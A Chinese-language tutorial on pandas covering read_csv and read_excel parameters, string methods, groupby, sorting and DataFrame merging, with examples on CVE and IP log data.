<p>(2)指定sheet名称读取，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df&#x3D;pd.read_excel(&quot;data_test.xlsx&quot;,sheet_name&#x3D;&quot;test1&quot;)</span><br></pre></td></tr></table></figure>

<p>(3)指定sheet索引号读取，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df&#x3D;pd.read_excel(&quot;data_test.xlsx&quot;,sheet_name&#x3D;0)#sheet索引号从0开始</span><br><span class="line">pandas.read_csv(filepath_or_buffer, sep&#x3D;’\t’, header&#x3D;’infer’, names&#x3D;None,index_col&#x3D;None, dtype&#x3D;None, engine&#x3D;None, nrows&#x3D;None)</span><br></pre></td></tr></table></figure>

<p>读取全部文件并转成list</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">import numpy as np</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line"># 分块处理大文件</span><br><span class="line">df &#x3D; pd.read_csv(&#39;1.csv&#39;,sep&#x3D;&quot;,&quot;,encoding&#x3D;&#39;utf-8&#39;)</span><br><span class="line">print(df)</span><br><span class="line">train_data &#x3D; np.array(df)</span><br><span class="line">train_x_list&#x3D;train_data.tolist()</span><br></pre></td></tr></table></figure>

<p>写入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DataFrame.to_csv(path_or_buf&#x3D;None, sep&#x3D;’,’, na_rep&#x3D;”, columns&#x3D;None,header&#x3D;True,index&#x3D;True,index_label&#x3D;None,mode&#x3D;’w’,encoding&#x3D;None)</span><br></pre></td></tr></table></figure>

<p>使用to_csv函数实现以csv格式存储<br>使用read_csv函数来读取csv文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import  pandas as pd</span><br><span class="line">a&#x3D;[&#123;&#39;_id&#39;: 1, &#39;name&#39;: &#39;张三&#39;, &#39;Chinese&#39;: 67, &#39;Math&#39;: 89, &#39;English&#39;: 97&#125;,&#123;&#39;_id&#39;: 2, &#39;name&#39;: &#39;李四&#39;, &#39;Chinese&#39;: 65, &#39;Math&#39;: 49, &#39;English&#39;: 78&#125;]</span><br><span class="line">df&#x3D;pd.DataFrame(list(a))</span><br><span class="line">df.to_csv(&quot;ddd.csv&quot;, index&#x3D;False, sep&#x3D;&#39;,&#39;,encoding&#x3D;&#39;gb2312&#39;)</span><br><span class="line">print(df)</span><br></pre></td></tr></table></figure>

<h3 id="1-1、head"><a href="#1-1、head" class="headerlink" title="1.1、head"></a>1.1、head</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pd.read_csv(data, header&#x3D;0) # 第一行</span><br><span class="line">pd.read_csv(data, header&#x3D;None) # 没有表头</span><br><span class="line">pd.read_csv(data, header&#x3D;[0,1,3]) # 多层索引MultiIndex</span><br></pre></td></tr></table></figure>

<h3 id="1-2、数据类型"><a href="#1-2、数据类型" class="headerlink" title="1.2、数据类型"></a>1.2、数据类型</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dtype可以指定各数据列的数据类型</span><br><span class="line"># 传入类型名称，或者以列名为键、以指定类型为值的字典</span><br><span class="line">pd.read_csv(data, dtype&#x3D;np.float64) # 所有数据均为此数据类型</span><br><span class="line">pd.read_csv(data, dtype&#x3D;&#123;&#39;c1&#39;:np.float64, &#39;c2&#39;: str&#125;) # 指定字段的类型</span><br><span class="line">pd.read_csv(data, dtype&#x3D;[datetime, datetime, str, float]) # 依次指定</span><br></pre></td></tr></table></figure>

<h3 id="1-3、引擎"><a href="#1-3、引擎" class="headerlink" title="1.3、引擎"></a>1.3、引擎</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#使用的分析引擎可以选择C或Python。C语言的速度最快，Python语言的功能最为完善，一般情况下，不需要另行指定。</span><br><span class="line"></span><br><span class="line"># 格式为engine&#x3D;None，其中可选值有&#123;&#39;c&#39;, &#39;python&#39;&#125;</span><br><span class="line">pd.read_csv(data, engine&#x3D;&#39;c&#39;)</span><br></pre></td></tr></table></figure>

<h3 id="1-4、时间处理"><a href="#1-4、时间处理" class="headerlink" title="1.4、时间处理"></a>1.4、时间处理</h3><p>parse_dates参数用于对时间日期进行解析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 布尔型、整型组成的列表、列表组成的列表或者字典，默认为False</span><br><span class="line"></span><br><span class="line">pd.read_csv(data, parse_dates&#x3D;True) # 自动解析日期时间格式</span><br><span class="line">pd.read_csv(data, parse_dates&#x3D;[&#39;年份&#39;]) # 指定日期时间字段进行解析</span><br><span class="line"></span><br><span class="line"># 将第1、4列合并解析成名为“时间”的时间类型列</span><br><span class="line"></span><br><span class="line">pd.read_csv(data, parse_dates&#x3D;&#123;&#39;时间&#39;:[1,4]&#125;)</span><br><span class="line"> #to_datetime将字符串转成时间格式 ，可以指定列</span><br><span class="line">df[&quot;日志接收时间&quot;] &#x3D; pd.to_datetime(df[&quot;日志接收时间&quot;])</span><br></pre></td></tr></table></figure>



<ul>
<li>infer_datetime_format被设定为True并且parse_dates可用，那么Pandas将尝试转换为日期类型。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 布尔型，默认为False</span><br><span class="line">pd.read_csv(data, parse_dates&#x3D;True, infer_datetime_format&#x3D;True)</span><br></pre></td></tr></table></figure>

<ul>
<li>对于DD/MM格式的日期类型，如日期2020-01-06，如果dayfirst=True，则会转换成2020-06-01。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 布尔型，默认为False</span><br><span class="line">pd.read_csv(data, dayfirst&#x3D;True, parse_dates&#x3D;[0])</span><br></pre></td></tr></table></figure>

<ul>
<li>cache_dates如果为True，则使用唯一的转换日期缓存来应用datetime转换。解析重复的日期字符串，尤其是带有时区偏移的日期字符串时，可能会大大提高速度。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 布尔型，默认为True</span><br><span class="line"></span><br><span class="line">pd.read_csv(data, cache_dates&#x3D;False)</span><br></pre></td></tr></table></figure>

<h3 id="1-5、分块处理"><a href="#1-5、分块处理" class="headerlink" title="1.5、分块处理"></a>1.5、分块处理</h3> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 分块处理大文件</span><br><span class="line"></span><br><span class="line">df_iterator &#x3D; pd.read_csv(&#39;cve.csv&#39;, chunksize&#x3D;200,sep&#x3D;&quot;,&quot;,encoding&#x3D;&#39;gbk&#39;)</span><br><span class="line">for index,df_tmp in enumerate(df_iterator):</span><br><span class="line">    for i in range(len(df_tmp)):</span><br><span class="line">         print(df_tmp.iloc[i])</span><br><span class="line"> </span><br><span class="line">enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; seasons &#x3D; [&#39;Spring&#39;, &#39;Summer&#39;, &#39;Fall&#39;, &#39;Winter&#39;]</span><br><span class="line">&gt;&gt;&gt; list(enumerate(seasons))</span><br><span class="line">&gt;&gt;&gt; [(0, &#39;Spring&#39;), (1, &#39;Summer&#39;), (2, &#39;Fall&#39;), (3, &#39;Winter&#39;)]</span><br></pre></td></tr></table></figure>

<h3 id="1-6、跳过指定行"><a href="#1-6、跳过指定行" class="headerlink" title="1.6、跳过指定行"></a>1.6、跳过指定行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 类似列表的序列或者可调用对象</span><br><span class="line"></span><br><span class="line"># 跳过前三行</span><br><span class="line">pd.read_csv(data, skiprows&#x3D;2)</span><br><span class="line"></span><br><span class="line"># 跳过前三行</span><br><span class="line">pd.read_csv(data, skiprows&#x3D;range(2))</span><br><span class="line"></span><br><span class="line"># 跳过指定行</span><br><span class="line">pd.read_csv(data, skiprows&#x3D;[24,234,141])</span><br><span class="line"></span><br><span class="line"># 跳过指定行</span><br><span class="line">pd.read_csv(data, skiprows&#x3D;np.array([2, 6, 11]))</span><br><span class="line"></span><br><span class="line"># 隔行跳过</span><br><span class="line">pd.read_csv(data, skiprows&#x3D;lambda x: x % 2 !&#x3D; 0)</span><br></pre></td></tr></table></figure>

<p>跳过空行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">skip_blank_lines指定是否跳过空行，如果为True，则跳过空行，否则数据记为NaN。</span><br><span class="line"></span><br><span class="line"># 布尔型，默认为True</span><br><span class="line"># 不跳过空行</span><br><span class="line">pd.read_csv(data, skip_blank_lines&#x3D;False)</span><br><span class="line"></span><br><span class="line"># 删除空数据所在的行</span><br><span class="line">df.dropna(axis&#x3D;0)</span><br></pre></td></tr></table></figure>

<h3 id="1-7、空值处理，跳过-感觉这个适合使用】"><a href="#1-7、空值处理，跳过-感觉这个适合使用】" class="headerlink" title="1.7、空值处理，跳过**[感觉这个适合使用】"></a>1.7、空值处理，跳过**[感觉这个适合使用】</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">na_filter是否检查丢失值（空字符串或空值）。设定na_filter&#x3D;False可以提升读取速度。</span><br><span class="line"># 布尔型，默认为True</span><br><span class="line">pd.read_csv(data, na_filter&#x3D;False) # 不检查</span><br><span class="line"></span><br><span class="line">[1,3,4,&#39;&#39;,&#39;&#39;,&#39;&#39;]</span><br></pre></td></tr></table></figure>

<h3 id="1-8、过滤字符串"><a href="#1-8、过滤字符串" class="headerlink" title="1.8、过滤字符串"></a>1.8、过滤字符串</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">escapechar，用于过滤数据中的该转入符</span><br><span class="line"></span><br><span class="line"># 长度为1的转义字符串，默认为None</span><br><span class="line"></span><br><span class="line">data &#x3D; &#39;a,b,c~1,2,3~4,5,6dd\nd&#39;</span><br><span class="line">df&#x3D;pd.read_csv(StringIO(data), lineterminator&#x3D;&#39;~&#39;,quotechar&#x3D;&#39;&quot;&#39;,escapechar&#x3D;&#39;\n&#39;)</span><br><span class="line">for i in range(len(df)):</span><br><span class="line">    print(list(df.iloc[i]))</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-164801870515723.png" alt="img"></p>
<h3 id="1-9、注释标识comment，指示不应分析行的部分"><a href="#1-9、注释标识comment，指示不应分析行的部分" class="headerlink" title="1.9、注释标识comment，指示不应分析行的部分"></a>1.9、注释标识comment，指示不应分析行的部分</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果在一行的开头找到该标识，则将完全忽略该行。此参数必须是单个字符。像空行一样</span><br><span class="line">s &#x3D; &#39;# notes\na,b,c\n# more notes\n1,2,3&#39;</span><br><span class="line">df&#x3D;pd.read_csv(StringIO(s), sep&#x3D;&#39;,&#39;, comment&#x3D;&#39;#&#39;, skiprows&#x3D;1)</span><br><span class="line">print(df)</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-164801869424422.png" alt="img"></p>
<h3 id="1-10、drop-删除数据"><a href="#1-10、drop-删除数据" class="headerlink" title="1.10、drop 删除数据"></a>1.10、drop 删除数据</h3><p>​       drop 中  axis=0 表示行，axis=1 表示列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">删除无用的列，列索引：&#39;name&#39;,&#39;name1&#39;；inplace参数指是否替代原来的df</span><br><span class="line">          data.drop(labels&#x3D;[&#39;name&#39;,&#39;name1&#39;],axis &#x3D; 1,inplace&#x3D;True)     </span><br><span class="line">删除无用的行，行索引：&#39;涨跌&#39;</span><br><span class="line">          df.drop([&#39;涨跌&#39;], axis&#x3D;0, inplace&#x3D;True</span><br></pre></td></tr></table></figure>



<h2 id="2、逐行读取【多行读取】"><a href="#2、逐行读取【多行读取】" class="headerlink" title="2、逐行读取【多行读取】"></a>2、逐行读取【多行读取】</h2><p>iloc和loc<br>loc按照标签取列，iloc按照位置取列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 第1行</span><br><span class="line">print(df.iloc[0])</span><br><span class="line"># 前3行</span><br><span class="line">print(df.iloc[:3])</span><br><span class="line"># 第1列</span><br><span class="line">print(df.iloc[:, 0])</span><br><span class="line"># 前2列</span><br><span class="line">print(df.iloc[:, :2])</span><br><span class="line"></span><br><span class="line">exam_Y&#x3D;examDf.loc[:,&#39;学习时间&#39;]</span><br></pre></td></tr></table></figure>

<h2 id="3、获取其他信息"><a href="#3、获取其他信息" class="headerlink" title="3、获取其他信息"></a>3、获取其他信息</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#获取文件头</span><br><span class="line">df.head()</span><br><span class="line">#获取后五行</span><br><span class="line">df.tail()</span><br><span class="line">#查看维度信息</span><br><span class="line">df.shape</span><br><span class="line">#查看数据表基本信息（维度、列名称、数据格式、所占空间等）</span><br><span class="line">data.info()</span><br></pre></td></tr></table></figure>



<h2 id="4、用pandas读取非文件类型"><a href="#4、用pandas读取非文件类型" class="headerlink" title="4、用pandas读取非文件类型"></a>4、用pandas读取非文件类型</h2><h3 id="4-1、pandas读取字符串"><a href="#4-1、pandas读取字符串" class="headerlink" title="4.1、pandas读取字符串"></a>4.1、pandas读取字符串</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from io import StringIO</span><br><span class="line">data &#x3D; &#39;a,b,c~1,2,3~4,5,6&#39;</span><br><span class="line">df&#x3D;pd.read_csv(StringIO(data), lineterminator&#x3D;&#39;~&#39;)</span><br><span class="line">for i in range(len(df)):</span><br><span class="line">    print(list(df.iloc[i]))</span><br></pre></td></tr></table></figure>



<h3 id="4-2、读取字节数据"><a href="#4-2、读取字节数据" class="headerlink" title="4.2、读取字节数据"></a>4.2、读取字节数据</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from io import BytesIO</span><br><span class="line">data &#x3D; (b&#39;word,length\n&#39;</span><br><span class="line">        b&#39;Tr\xc3\xa4umen,7\n&#39;</span><br><span class="line">        b&#39;Gr\xc3\xbc\xc3\x9fe,5&#39;)</span><br><span class="line"></span><br><span class="line">pd.read_csv(BytesIO(data))</span><br></pre></td></tr></table></figure>

<h1 id="二、数据处理基础"><a href="#二、数据处理基础" class="headerlink" title="二、数据处理基础"></a>二、数据处理基础</h1><h2 id="1、字符串处理"><a href="#1、字符串处理" class="headerlink" title="1、字符串处理"></a>1、字符串处理</h2><h3 id="1-1、cat函数用于字符串的拼接"><a href="#1-1、cat函数用于字符串的拼接" class="headerlink" title="1.1、cat函数用于字符串的拼接"></a>1.1、cat函数用于字符串的拼接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df &#x3D; pd.read_csv(&#39;cve.csv&#39;,sep&#x3D;&quot;,&quot;,encoding&#x3D;&#39;gbk&#39;)</span><br><span class="line">print(list(df.head()))</span><br><span class="line">z&#x3D;df[&quot;0&quot;].str.cat(df[&quot;poc&quot;],sep&#x3D;&#39;-&#39;*3)</span><br><span class="line">print(list(z))</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-164801873882524.png" alt="img"></p>
<h3 id="1-2、contains：判断某个字符串是否包含给定字符"><a href="#1-2、contains：判断某个字符串是否包含给定字符" class="headerlink" title="1.2、contains：判断某个字符串是否包含给定字符"></a>1.2、contains：判断某个字符串是否包含给定字符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df &#x3D; pd.read_csv(&#39;cve.csv&#39;,sep&#x3D;&quot;,&quot;,encoding&#x3D;&#39;gbk&#39;)</span><br><span class="line">print(list(df.head()))</span><br><span class="line">z&#x3D;df[&quot;0&quot;].str.contains(&quot;2021&quot;)</span><br><span class="line">print(list(z))</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-164801875156525.png" alt="img"></p>
<h3 id="1-3、startswith-endswith：判断某个字符串是否以…开头-结尾"><a href="#1-3、startswith-endswith：判断某个字符串是否以…开头-结尾" class="headerlink" title="1.3、startswith/endswith：判断某个字符串是否以…开头/结尾"></a>1.3、startswith/endswith：判断某个字符串是否以…开头/结尾</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df&#x3D; pd.read_csv(&#39;cve.csv&#39;,sep&#x3D;&quot;,&quot;,encoding&#x3D;&#39;gbk&#39;)</span><br><span class="line">print(list(df.head()))</span><br><span class="line">z&#x3D;df[&quot;0&quot;].str.startswith(&quot;cve&quot;)</span><br><span class="line">H&#x3D;df[&quot;0&quot;].str.endswith(&quot;2021&quot;)</span><br><span class="line">print(list(z))</span><br><span class="line">print(list(H))</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-164801877924526.png" alt="img"></p>
<h3 id="1-4、count：计算给定字符在字符串中出现的次数"><a href="#1-4、count：计算给定字符在字符串中出现的次数" class="headerlink" title="1.4、count：计算给定字符在字符串中出现的次数"></a>1.4、count：计算给定字符在字符串中出现的次数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df &#x3D; pd.read_csv(&#39;ip.csv&#39;,sep&#x3D;&quot;,&quot;,encoding&#x3D;&#39;utf-8&#39;)</span><br><span class="line">print(list(df.head()))</span><br><span class="line">z&#x3D;df[&quot;city&quot;].str.count(&quot;3&quot;)</span><br><span class="line">print(list(z))</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-164801878485727.png" alt="img"></p>
<h3 id="1-5、get：获取指定位置的字符串"><a href="#1-5、get：获取指定位置的字符串" class="headerlink" title="1.5、get：获取指定位置的字符串"></a>1.5、get：获取指定位置的字符串</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df &#x3D; pd.read_csv(&#39;ip.csv&#39;,sep&#x3D;&quot;,&quot;,encoding&#x3D;&#39;utf-8&#39;)</span><br><span class="line">print(list(df.head()))</span><br><span class="line">z&#x3D;df[&quot;ip&quot;].str.get(-1)   #转成字符串最后一个</span><br><span class="line">z1&#x3D;df[&quot;ip&quot;].str.split(&quot;.&quot;)  #以&#39;.&#39;分割</span><br><span class="line">z2&#x3D;df[&quot;ip&quot;].str.split(&quot;.&quot;).str.get(0)</span><br><span class="line">print(list(z))</span><br><span class="line">print(list(z1))</span><br><span class="line">print(list(z2))</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-164801880305928.png" alt="img"></p>
<h3 id="1-6、len：计算字符串长度"><a href="#1-6、len：计算字符串长度" class="headerlink" title="1.6、len：计算字符串长度"></a>1.6、len：计算字符串长度</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df &#x3D; pd.read_csv(&#39;ip.csv&#39;,sep&#x3D;&quot;,&quot;,encoding&#x3D;&#39;utf-8&#39;)</span><br><span class="line">print(list(df.head()))</span><br><span class="line">z&#x3D;df[&quot;ip&quot;].str.len()</span><br><span class="line">print(list(z))</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-164801880928229.png" alt="img"></p>
<h3 id="1-7、upper-lower：英文大小写转换"><a href="#1-7、upper-lower：英文大小写转换" class="headerlink" title="1.7、upper/lower：英文大小写转换"></a>1.7、upper/lower：英文大小写转换</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df &#x3D; pd.read_csv(&#39;cve.csv&#39;,sep&#x3D;&quot;,&quot;,encoding&#x3D;&#39;gbk&#39;)</span><br><span class="line">print(list(df.head()))</span><br><span class="line">z1&#x3D;df[&quot;name&quot;].str.upper()  #转成大写</span><br><span class="line">z2&#x3D;df[&quot;name&quot;].str.lower()   #转成小写</span><br><span class="line">print(list(z1))</span><br><span class="line">print(list(z2))</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-164801881761430.png" alt="img"></p>
<h3 id="1-8、pad-side参数-center：在字符串的左边、右边或左右两边添加给定字符"><a href="#1-8、pad-side参数-center：在字符串的左边、右边或左右两边添加给定字符" class="headerlink" title="1.8、pad+side参数/center：在字符串的左边、右边或左右两边添加给定字符"></a>1.8、pad+side参数/center：在字符串的左边、右边或左右两边添加给定字符</h3><h3 id="1-9、-slice-replace：使用给定的字符串，替换指定的位置的字符"><a href="#1-9、-slice-replace：使用给定的字符串，替换指定的位置的字符" class="headerlink" title="1.9、 slice_replace：使用给定的字符串，替换指定的位置的字符"></a>1.9、 slice_replace：使用给定的字符串，替换指定的位置的字符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df &#x3D; pd.read_csv(&#39;cve.csv&#39;,sep&#x3D;&quot;,&quot;,encoding&#x3D;&#39;gbk&#39;)</span><br><span class="line">z&#x3D;df[&quot;name&quot;].str.slice_replace(4,8,&quot;*&quot;*4)</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-164801882273031.png" alt="img"></p>
<h3 id="1-10、replace：将指定位置的字符，替换为给定的字符串-可以使用正则替换"><a href="#1-10、replace：将指定位置的字符，替换为给定的字符串-可以使用正则替换" class="headerlink" title="1.10、replace：将指定位置的字符，替换为给定的字符串[可以使用正则替换"></a>1.10、replace：将指定位置的字符，替换为给定的字符串[可以使用正则替换</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df &#x3D; pd.read_csv(&#39;cve.csv&#39;,sep&#x3D;&quot;,&quot;,encoding&#x3D;&#39;gbk&#39;)</span><br><span class="line">z&#x3D;df[&quot;name&quot;].str.replace(&quot;-&quot;,&quot;_&quot;)</span><br><span class="line">z1&#x3D;df[&quot;name&quot;].str.replace(&quot;-\d&#123;4&#125;-&quot;,&quot;-xxxx-&quot;)</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-164801882911332.png" alt="img"></p>
<h3 id="1-11、strip-rstrip-lstrip：去除空白符、换行符"><a href="#1-11、strip-rstrip-lstrip：去除空白符、换行符" class="headerlink" title="1.11、strip/rstrip/lstrip：去除空白符、换行符"></a>1.11、strip/rstrip/lstrip：去除空白符、换行符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df &#x3D; pd.read_csv(&#39;cve.csv&#39;,sep&#x3D;&quot;,&quot;,encoding&#x3D;&#39;gbk&#39;)</span><br><span class="line">z&#x3D;df[&quot;name&quot;].str.str.strip()</span><br></pre></td></tr></table></figure>



<h3 id="1-12、findall：利用正则表达式，去字符串中匹配，返回查找结果的列表"><a href="#1-12、findall：利用正则表达式，去字符串中匹配，返回查找结果的列表" class="headerlink" title="1.12、findall：利用正则表达式，去字符串中匹配，返回查找结果的列表"></a>1.12、findall：利用正则表达式，去字符串中匹配，返回查找结果的列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df &#x3D; pd.read_csv(&#39;cve.csv&#39;,sep&#x3D;&quot;,&quot;,encoding&#x3D;&#39;gbk&#39;)</span><br><span class="line">z1&#x3D;df[&quot;name&quot;].str.findall(&quot;cve.\d+&quot;)</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-164801883469133.png" alt="img"></p>
<h2 id="2、判断重复值-duplicated"><a href="#2、判断重复值-duplicated" class="headerlink" title="2、判断重复值-duplicated()"></a>2、判断重复值-duplicated()</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df2.duplicated(subset&#x3D;[&quot;col3&quot;,&quot;col4&quot;]) </span><br></pre></td></tr></table></figure>

<h2 id="3、groupby分组"><a href="#3、groupby分组" class="headerlink" title="3、groupby分组"></a>3、groupby分组</h2><h3 id="3-1、count"><a href="#3-1、count" class="headerlink" title="3.1、count"></a>3.1、count</h3><p>过滤csv重复行<br>根据ip、city进行分组，并根据每组的isp计数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t&#x3D;df.groupby([&quot;ip&quot;,&quot;city&quot;])[&quot;isp&quot;].count()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">import numpy as np</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line"># 分块处理大文件</span><br><span class="line"></span><br><span class="line">df &#x3D; pd.read_csv(&#39;1.csv&#39;,sep&#x3D;&quot;,&quot;,encoding&#x3D;&#39;utf-8&#39;)</span><br><span class="line">#根据</span><br><span class="line">t&#x3D;df.groupby([&quot;ip&quot;,&quot;city&quot;]).count()</span><br><span class="line">temp&#x3D;np.array(t).tolist()</span><br><span class="line">z&#x3D;list(t.index)</span><br><span class="line">info&#x3D;list()</span><br><span class="line">for  i in range(len(z)):</span><br><span class="line">    info.append([z[i],temp[i][0]])</span><br><span class="line">print(info)</span><br><span class="line"></span><br><span class="line">结果：[[(&#39;111.192.103.3&#39;, &#39;东城区&#39;), 3], [(&#39;111.192.98.74&#39;, &#39;东城区&#39;), 3], [(&#39;122.115.227.215&#39;, &#39;北京市&#39;), 2]]</span><br></pre></td></tr></table></figure>

<h3 id="3-2、sum"><a href="#3-2、sum" class="headerlink" title="3.2、sum"></a>3.2、sum</h3><ul>
<li>根据ip进行分组，并对每组的size求和</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t&#x3D;df.groupby([&quot;ip&quot;])[&quot;size&quot;].sum()</span><br></pre></td></tr></table></figure>

<ul>
<li>仅按city 为东城区，对ip 和city进行分组，并对每组的isp进行计数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t&#x3D;df[df[&quot;city&quot;]&#x3D;&#x3D;&quot;东城区&quot;].groupby([&quot;ip&quot;,&quot;city&quot;])[&quot;isp&quot;].count()</span><br></pre></td></tr></table></figure>

<p>过滤字段 清洗</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">z&#x3D;df[(df[&quot;源境内外&quot;]&#x3D;&#x3D;&quot;境外&quot;)&amp;(df[&quot;目的境内外&quot;]&#x3D;&#x3D;&quot;境内&quot;)].groupby(t)[&quot;目的IP地址&quot;].count()</span><br></pre></td></tr></table></figure>



<h3 id="3-3、agg"><a href="#3-3、agg" class="headerlink" title="3.3、agg"></a>3.3、agg</h3><p>1.将单个函数应用于组中的列</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/640-164801896145734.png" alt="img"></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/640-164801896959035.png" alt="img"></p>
<p>2.将多个函数应用于组中的列</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/640-164801897458636.png" alt="img"></p>
<h2 id="4、排序"><a href="#4、排序" class="headerlink" title="4、排序"></a>4、排序</h2><h3 id="4-1、sort-values"><a href="#4-1、sort-values" class="headerlink" title="4.1、sort_values()"></a><strong>4.1、sort_values()</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t&#x3D;df.sort_values(&quot;日志接收时间&quot;)</span><br></pre></td></tr></table></figure>



<h3 id="4-2、sort-index"><a href="#4-2、sort-index" class="headerlink" title="4.2、sort_index()"></a><strong>4.2、sort_index()</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">info1&#x3D;info.sort_index() info1&#x3D;info.sort_index(axis&#x3D;&quot;columns&quot;)</span><br></pre></td></tr></table></figure>



<h2 id="5、排名-rank方法。"><a href="#5、排名-rank方法。" class="headerlink" title="5、排名 rank方法。"></a>5、排名 rank方法。</h2><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-164801901442637.png" alt="img"></p>
<h2 id="6、合并拼接"><a href="#6、合并拼接" class="headerlink" title="6、合并拼接"></a>6、合并拼接</h2><ul>
<li>merge方法主要基于两个dataframe的共同列进行合并，</li>
<li>join方法主要基于两个dataframe的索引进行合并，</li>
<li>concat方法是对series或dataframe进行行拼接或列拼接。</li>
</ul>
<h3 id="6-1、concat（）"><a href="#6-1、concat（）" class="headerlink" title="6.1、concat（）"></a>6.1、concat（）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">info &#x3D; pd.concat([info,df],axis&#x3D;0,ignore_index&#x3D;True)</span><br><span class="line"></span><br><span class="line">DEMO:	</span><br><span class="line">judge&#x3D;0</span><br><span class="line">for i in os.listdir(&quot;file&quot;):</span><br><span class="line">    df&#x3D;pd.read_csv(&quot;file&#x2F;&quot;+i,index_col&#x3D;None, header&#x3D;0).copy()</span><br><span class="line">    if judge&#x3D;&#x3D;0:</span><br><span class="line">        info&#x3D;df</span><br><span class="line">    else:</span><br><span class="line">        info &#x3D; pd.concat([info,df],axis&#x3D;0,ignore_index&#x3D;True)</span><br><span class="line"></span><br><span class="line">    judge+&#x3D;1</span><br><span class="line"></span><br><span class="line">info &#x3D; info.sort_values(&quot;日志接收时间&quot;)</span><br><span class="line">print(info)</span><br></pre></td></tr></table></figure>

<h3 id="6-2、Merge方法"><a href="#6-2、Merge方法" class="headerlink" title="6.2、Merge方法"></a>6.2、Merge方法</h3><p>pandas的merge方法是基于共同列，将两个dataframe连接起来。merge方法的主要参数：</p>
<ul>
<li><p>left/right：左/右位置的dataframe。</p>
</li>
<li><p>how：数据合并的方式。left：基于左dataframe列的数据合并；right：基于右dataframe列的数据合并；outer：基于列的数据外合并（取并集）；inner：基于列的数据内合并（取交集）；默认为’inner’。</p>
</li>
<li><p>on：用来合并的列名，这个参数需要保证两个dataframe有相同的列名。</p>
</li>
<li><p>left_on/right_on：左/右dataframe合并的列名，也可为索引，数组和列表。</p>
</li>
<li><p>left_index/right_index：是否以index作为数据合并的列名，True表示是。</p>
</li>
<li><p>sort：根据dataframe合并的keys排序，默认是。</p>
</li>
<li><p>suffixes：若有相同列且该列没有作为合并的列，可通过suffixes设置该列的后缀名，一般为元组和列表类型。</p>
</li>
</ul>
